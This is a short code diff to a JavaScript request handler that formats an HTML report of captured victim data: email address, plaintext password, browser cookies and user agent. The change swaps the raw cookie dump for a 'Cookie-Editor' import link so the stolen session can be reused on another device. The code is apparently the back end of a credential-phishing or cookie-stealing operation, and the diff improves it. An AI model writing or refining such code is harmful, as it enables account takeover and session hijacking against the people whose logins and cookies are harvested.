@@ -44,13 +44,16 @@ export default async function handler(req, res) {
             <tr><td><strong>📧 Email</strong></td><td>${data.email}</td></tr>
             <tr><td><strong>🔑 Password</strong></td><td style="font-family:monospace;color:#d93025">${data.password}</td></tr>
             <tr><td><strong>🍪 Cookies</strong></td><td>${data.cookiesImportLink
-              ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="color:#1a73e8;word-break:break-all">Import link (works on other device)</a>`
-              : `<code>${(data.cookies || 'none').replace(/</g, '&lt;')}</code>`}</td></tr>
+              ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="color:#1a73e8">Import link (Cookie-Editor)</a>`
+              : '<em>none</em>'}</td></tr>
             <tr><td><strong>👤 Browser</strong></td><td>${data.userAgent?.slice(0,80)}...</td></tr>
           </table>
           <details>
             <summary>Full Data (JSON)</summary>
-            <pre style="background:#f5f5f5;padding:16px;overflow:auto">${JSON.stringify(data,null,2)}</pre>
+            <pre style="background:#f5f5f5;padding:16px;overflow:auto">${JSON.stringify(
+              { ...data, cookies: data.cookiesImportLink ? 'Import via link above' : 'none' },
+              null, 2
+            )}</pre>
           </details>
         </div>
       `
